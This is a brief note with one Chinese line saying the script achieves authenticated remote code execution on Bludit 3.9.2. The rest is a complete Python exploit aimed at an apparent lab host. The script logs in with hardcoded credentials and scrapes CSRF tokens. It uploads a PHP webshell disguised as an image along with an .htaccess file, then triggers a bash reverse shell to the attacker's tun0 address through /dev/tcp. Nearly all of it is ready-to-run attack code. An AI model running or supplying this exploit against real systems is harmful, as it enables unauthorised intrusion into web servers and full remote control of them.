# bludit3.9.2

这个脚本可以成功实现带凭据的rce

```bash
#!/usr/bin/env python3
import netifaces as ni
import re
import requests
callback_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
username = 'fergus'
password = 'RolandDeschain'
url = 'http://10.10.10.191'
s = requests.session()
# Login
resp = s.get(f'{url}/admin/')
csrf = re.findall('name="tokenCSRF" value="([0-9a-f]{32,})"', resp.text)[0]
s.post(f'{url}/admin/', allow_redirects=False,
        data = {'tokenCSRF': csrf, 'username': username, 'password': password, 'remember': 'true', 'save': ''})
# Get CSRF to upload images
resp = s.get(f'{url}/admin/new-content/index.php')
csrf = re.findall('\nvar tokenCSRF = "([0-9a-f]{32,})";', resp.text)[0]
# Upload webshell
form_data = {'images[]': ('0xdf.php', '<?php system($_REQUEST["cmd"]); ?>', 'image/png')}
data = {'uuid': 'junk',
        'tokenCSRF': csrf}
s.post(f'{url}/admin/ajax/upload-images', data=data, files=form_data, proxies={'http':'http://127.0.0.1:8080'}, allow_redirects=False)
# Upload .htaccess file
form_data = {'images[]': ('.htaccess', 'RewriteEngine off', 'image/png')}
s.post(f'{url}/admin/ajax/upload-images', data=data, files=form_data, proxies={'http':'http://127.0.0.1:8080'}, allow_redirects=False)
# Trigger Shell
resp = s.get(f'{url}/bl-content/tmp/0xdf.php', params={'cmd':f'bash -c "bash -i >& /dev/tcp/{callback_ip}/443 0>&1"'})
```
